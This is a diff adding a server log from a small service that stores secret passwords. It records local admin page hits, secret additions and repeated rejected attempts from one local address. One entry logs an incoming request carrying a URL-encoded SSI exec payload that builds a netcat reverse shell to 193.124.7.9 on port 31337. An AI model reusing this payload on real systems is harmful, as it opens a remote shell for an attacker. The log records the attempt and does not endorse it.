@@ -1,0 +1,26 @@
+[18:37:11] This session was started on 2022. 05. 15. 18:37:11
+[18:37:11] Listening to port 3001...
+[18:37:11] Listening to port 80...
+[18:37:14] New secret password added by 192.168.1.2
+[18:37:15] Illegal attempt to add new secret from 192.168.1.2
+[18:37:18] Illegal attempt to add new secret from 192.168.1.2
+[18:37:22] Illegal attempt to add new secret from 192.168.1.2
+[18:37:24] Illegal attempt to add new secret from 192.168.1.2
+[18:37:28] secrets.json file created.
+[18:37:28] New secret password added by 192.168.1.2
+[18:37:30] Illegal attempt to add new secret from 192.168.1.2
+[18:37:33] Illegal attempt to add new secret from 192.168.1.2
+[18:37:37] New secret password added by 192.168.1.2
+[18:38:51] Illegal attempt to add new secret from 192.168.1.2
+[18:39:33] 193.124.7.9 on login page. /incl/image_test.shtml?camnbr=%3c%21--%23exec%20cmd=%22mkfifo%20/tmp/s;nc%20-w%205%20193.124.7.9%2031337%200%3C/tmp/s|/bin/sh%3E/tmp/s%202%3E/tmp/s;rm%20/tmp/s%22%20--%3e
+[18:39:38] 192.168.1.2 served. /admin
+[18:39:42] Illegal attempt to add new secret from 192.168.1.2
+[18:39:44] Illegal attempt to add new secret from 192.168.1.2
+[18:39:58] 192.168.1.2 served. /admin
+[18:40:02] New secret password added by 192.168.1.2
+[18:40:24] 192.168.1.2 served. /admin
+[18:40:36] New secret password added by 192.168.1.2
+[18:40:44] Illegal attempt to add new secret from 192.168.1.2
+[18:41:19] 192.168.1.2 served. /admin
+[18:41:26] Illegal attempt to add new secret from 192.168.1.2
+[18:41:30] New secret password added by 192.168.1.2
